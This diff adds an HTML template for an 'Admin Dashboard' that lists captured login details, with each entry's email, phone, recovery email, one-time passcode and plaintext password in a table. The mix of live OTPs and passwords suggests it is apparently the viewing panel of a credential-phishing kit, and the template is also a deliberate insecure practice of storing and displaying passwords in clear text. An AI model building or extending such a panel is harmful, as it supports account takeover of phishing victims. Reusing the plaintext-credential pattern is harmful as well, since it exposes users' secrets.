@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Dashboard</title>
+</head>
+<body>
+    <h1>Admin Dashboard</h1>
+    <table border="1">
+        <thead>
+            <tr>
+                <th>Email</th>
+                <th>Phone</th>
+                <th>Recovery Email</th>
+                <th>OTP</th>
+                <th>Password</th>  <!-- Add password column -->
+            </tr>
+        </thead>
+        <tbody>
+            {% for details in login_details %}
+            <tr>
+                <td>{{ details.email }}</td>
+                <td>{{ details.phone }}</td>
+                <td>{{ details.recovery_email }}</td>
+                <td>{{ details.otp }}</td>
+                <td>{{ details.password }}</td>  <!-- Display password -->
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</body>
+</html>
